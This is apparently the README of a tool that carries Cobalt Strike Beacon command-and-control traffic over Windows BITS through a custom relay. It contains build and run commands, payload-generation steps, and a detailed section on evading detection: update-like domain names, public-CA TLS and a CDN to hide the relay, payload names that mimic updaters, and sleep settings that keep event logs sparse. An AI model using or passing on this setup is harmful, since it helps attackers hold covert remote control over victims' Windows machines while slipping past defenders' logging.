# BITS UDC2

Cobalt Strike UDC2 transport that carries Beacon frames through Windows Background Intelligent Transfer Service (BITS).

A Windows BOF acts as the Beacon transport, and a POSIX relay terminates the BITS Upload Protocol and forwards frames to a Cobalt Strike UDC2 listener over TCP.

## How it works

```text
Beacon
  │ UDC2 proxyCall()
  ▼
BITS service (svchost.exe)
  │ BITS_POST upload + HTTP download
  ▼
BITS UDC2 relay
  │ length-prefixed UDC2 TCP stream
  ▼
Cobalt Strike team server
  │ UDC2 listener
  └── reply frame returned through the relay and BITS
```

For each UDC2 exchange, the BOF creates one `BG_JOB_TYPE_UPLOAD_REPLY` job. On the final fragment the relay forwards the frame to the team server, caches the reply, and returns its location in a `BITS-Reply-URL` header (MC-BUP); the BITS service then downloads the reply from `/down/<sid>` into the job's reply file before `Close-Session` releases it. Using one job for both directions halves the BITS job count — and therefore the operational-log event volume — compared to separate upload and download jobs.

The relay keeps one team-server TCP connection and one pending reply per Beacon session ID. The team-server connection uses the UDC2 framing convention used by the official [`Cobalt-Strike/icmp-udc2`](https://github.com/Cobalt-Strike/icmp-udc2) reference: a little-endian length-prefixed `go` handshake, followed by raw Beacon frames and length-prefixed replies.

## Repository layout

```text
bof/udc2_bits.c   Windows UDC2 transport BOF
relay/main.c      POSIX BITS relay and UDC2 team-server bridge
Makefile          Build entry points
```

Generated files are placed in `dist/`:

| Output | Purpose |
| --- | --- |
| `dist/udc2_bits.x64.o` | x64 BOF for the UDC2 listener |
| `dist/udc2_bits.x86.o` | x86 BOF for the UDC2 listener |
| `dist/bits-udc2-relay` | POSIX relay executable |

## Prerequisites

On the build host:

- a C compiler (`cc` or `clang`);
- `make`; and
- MinGW-w64 x64 and x86 compilers for the BOFs:
  - `x86_64-w64-mingw32-gcc`
  - `i686-w64-mingw32-gcc`

On macOS, install MinGW-w64 with Homebrew:

```sh
brew install mingw-w64
```

On Debian-based Linux distributions, install the equivalent packages, for example:

```sh
sudo apt install build-essential gcc-mingw-w64
```

The runtime side requires a Windows target with BITS and a Cobalt Strike team server with UDC2 listener support.

## Build

Build the POSIX relay:

```sh
make all
```

Build both BOF architectures. The relay URL is compiled into the BOF, so set it to the URL reachable by the Windows target:

```sh
make udc2 RELAY_URL=http://relay.example.test:8090
```

If `RELAY_URL` changes, rebuild the BOF and regenerate any payloads that used the previous value. The Makefile records the last URL in `dist/.relay_url`.

## Run the relay

First create a UDC2 listener in Cobalt Strike and note its team-server port. Then start the relay on a host that can reach that listener:

```sh
./dist/bits-udc2-relay \
  -port 8090 \
  -root relay \
  -ts-addr 127.0.0.1 \
  -ts-port 3333
```

Required options:

- `-ts-addr <address>` — address of the team server;
- `-ts-port <port>` — the team server's UDC2 listener port.

Optional options:

- `-port <port>` — relay HTTP/BITS port; default `8090`;
- `-root <directory>` — mailbox and audit directory; default `relay`;
- `-v` — log raw request headers;
- `-q` — suppress per-request log lines; and
- `-reply-base <url>` — absolute prefix used in `BITS-Reply-URL` (required
  behind a TLS terminator, e.g. `-reply-base https://updates.example.com`).

The relay creates these directories under `-root`:

```text
<root>/inbox/<sid>/<timestamp>_<transaction>.bin
<root>/outbox/
```

`inbox` contains uploaded frames for troubleshooting and audit. The reply cache is held in memory; `outbox` is created for mailbox compatibility but is not used for pending UDC2 replies.

The relay speaks plain HTTP by default. For HTTPS and redirector deployments, see [Operational deployment with a redirector](#operational-deployment-with-a-redirector).

## Operational deployment with a redirector

For anything beyond an isolated lab network, do not expose the relay directly. Every
BITS job records its remote URL in the target's
`Microsoft-Windows-Bits-Client/Operational` log, and a plain `http://IP:8090/up/...`
entry there is a high-signal indicator. Place the relay behind a domain and a TLS
terminator so those entries resemble ordinary update traffic:

```text
Windows target
  │ BITS (HTTPS)
  ▼
updates.example.com:443        TLS terminator (Caddy/nginx, public CA certificate)
  │ reverse proxy, loopback only
  ▼
BITS UDC2 relay (127.0.0.1:8090)
  │
  ▼
Cobalt Strike team server (UDC2 listener)
```

Steps:

1. **DNS.** Point a software-update-flavored name (`updates.`, `cdn.`, `dl-`,
   `telemetry.`) at the relay host.
2. **TLS terminator.** With nginx, terminate TLS in a server block proxying to the
   loopback relay. Certificates from Let's Encrypt via certbot:

   ```nginx
   server {
       listen 443 ssl;
       server_name updates.example.com;

       ssl_certificate     /etc/letsencrypt/live/updates.example.com/fullchain.pem;
       ssl_certificate_key /etc/letsencrypt/live/updates.example.com/privkey.pem;

       location / {
           proxy_pass http://127.0.0.1:8090;
           proxy_http_version 1.1;
           proxy_set_header Connection "";
           proxy_set_header Host $host;
       }
   }
   ```

   Two nginx specifics matter for this transport:

   - `proxy_http_version 1.1` is required: nginx proxies with HTTP/1.0 by default,
     and the BITS client rejects an HTTP/1.0 upstream with
     `BG_E_INSUFFICIENT_HTTP_SUPPORT`. Clearing the `Connection` header preserves
     the keep-alive session BITS expects.
   - The non-standard `BITS_POST` method must pass through: no `limit_except` or
     method filtering on this location.

   When TLS-fronted, pass `-reply-base https://updates.example.com` to the relay so
   the advertised `BITS-Reply-URL` carries the public address. BITS validates
   server certificates against the Windows certificate store, so the certificate
   must chain to a public CA (Let's Encrypt qualifies; self-signed does not).
3. **Restrict the relay.** Firewall the relay port from external access so only the
   TLS terminator can reach it, and leave only 443 exposed.
4. **Rebuild and redeploy.** Build the BOF with the public address and regenerate
   every payload:

   ```sh
   make udc2 RELAY_URL=https://updates.example.com
   ```

   The URL is compiled into the BOF and into each payload at generation time;
   payloads built against an earlier URL keep contacting that address.
5. **Optional CDN.** A CDN such as Cloudflare in front of the domain hides the relay
   origin and makes the destination unremarkable. Verify that the `BITS_POST`
   method passes through the chosen CDN before deploying.

Host-side measures that pair with a redirector deployment:

- BITS event ID 3 records the process that created each job. Generate payloads with
  a plausible updater name and run them from a plausible location (for example
  `C:\ProgramData\...`), not from the Downloads folder.
- The event log writes one entry per job. A long Beacon sleep with jitter keeps the
  log sparse; BITS scheduling makes this a low-frequency channel in any case.

## Configure Cobalt Strike and run a payload

1. Start the team server.
2. Create a **User-Defined C2** listener using the team-server port passed to `-ts-port`.
3. Select `dist/udc2_bits.x64.o` or `dist/udc2_bits.x86.o` as the UDC2 BOF, matching the target architecture.
4. Generate a payload from that listener.
5. Start the relay before executing the payload on the Windows host.

The first exchange can take several seconds because BITS schedules jobs asynchronously. Subsequent exchanges follow the Beacon sleep interval. The team server sees the relay as the TCP peer, not the Windows target.

## Limits and security notes

- The relay accepts unauthenticated HTTP/BITS traffic and binds to `0.0.0.0`; restrict it with a firewall or controlled reverse proxy.
- Plain HTTP exposes the relay URL and frame contents to the network. Use HTTPS where appropriate.
- Uploaded frames are stored under `-root/inbox`; protect that directory according to your data-handling requirements.
- The relay supports up to 64 active BITS sessions and an 8 MiB upload per message.
- The BOF reads replies into a 4 MiB buffer and uses a 60-second BITS job timeout.
- BITS scheduling introduces high latency, so this transport is intended for low-frequency experiments rather than bulk transfer.
- BITS operational logs and job metadata can reveal the remote URL and job activity.

## References

- [Cobalt-Strike/icmp-udc2](https://github.com/Cobalt-Strike/icmp-udc2)
- [BITS Upload Protocol](https://learn.microsoft.com/en-us/windows/win32/bits/bits-upload-protocol)
- [MC-BUP protocol specification](https://learn.microsoft.com/en-us/openspecs/windows_protocols/mc-bup/2c2fe5e1-f105-4264-b80b-1f31e9e5dc6b)
